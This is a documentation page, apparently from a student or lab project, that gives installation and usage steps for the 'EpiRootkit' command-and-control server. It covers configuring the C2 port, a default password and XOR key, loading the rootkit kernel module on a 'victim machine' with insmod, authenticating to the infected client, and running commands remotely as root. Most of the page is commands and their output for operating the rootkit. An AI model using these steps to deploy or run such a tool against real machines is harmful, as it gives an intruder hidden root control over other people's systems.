---
title: "Installation"
description: "Step-by-step installation and setup guide"
icon: "download"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-25T16:00:00+01:00"
draft: false
toc: true
weight: 302
---

# Installation Guide

Setup instructions for the EpiRootkit C2 server.

## Prerequisites

### Required Software
- **Node.js**: Version 18+ 
- **pnpm**: Package manager (recommended)

### Verify Installation
```bash
node --version
# v18.17.0

pnpm --version
# 8.6.2

# Install pnpm if missing
npm install -g pnpm
```

## Installation

### 1. Install Dependencies
```bash
cd attacking_program
pnpm install
# ✓ Dependencies installed successfully
```

### 2. Review Configuration
```bash
cat config.env
```

**Default Settings:**
```bash
# Server ports
C2_PORT=4444                    # C2 server port
WEB_PORT=3000                   # Web interface port

# Authentication (SHA-512 of "password")
PASSWORD_HASH=b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86

# XOR Encryption
ENCRYPTION_KEY=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef  # 32-byte hex key
ENABLE_ENCRYPTION=true          # XOR encryption enabled by default
```

### 3. Start Server
```bash
pnpm start
# ✓ Server started on port 4444
# ✓ Web interface started on port 3000
# c2-server$ 
```

## Verification

### CLI Interface
```bash
# Test CLI commands
help
# EpiRootkit C2 Commands
# clients                    - List connected clients
# auth <client> <password>   - Authenticate with client
# ...

ls
# No clients connected (initially)
```

### Web Interface
Access at: `http://localhost:3000`
- Login with password: `password`
- Dashboard shows connected clients
- All CLI features available via web

## Configuration Options

### Change Ports
```bash
# Edit config.env
C2_PORT=8080        # Custom C2 port
WEB_PORT=8000       # Custom web port
```

### Change Password
```bash
# Generate new SHA-512 hash
echo -n "newpassword" | sha512sum
# Copy the hash to config.env as PASSWORD_HASH
```

### Disable Encryption
```bash
# Edit config.env
ENABLE_ENCRYPTION=false
```

## Quick Test

### 1. Connect Rootkit (victim machine)
```bash
sudo insmod epirootkit.ko
# C2 shows: ✓ Client-1 Connected
```

### 2. Authenticate
```bash
auth Client-1 password
# ✓ Authenticated
# SUCCESS: Authentication successful
```

### 3. Test Commands
```bash
exec Client-1 whoami
# Exit code: 0
# Output: root

status Client-1
# EpiRootkit Status: Version 1.0.0, Authentication: YES
```

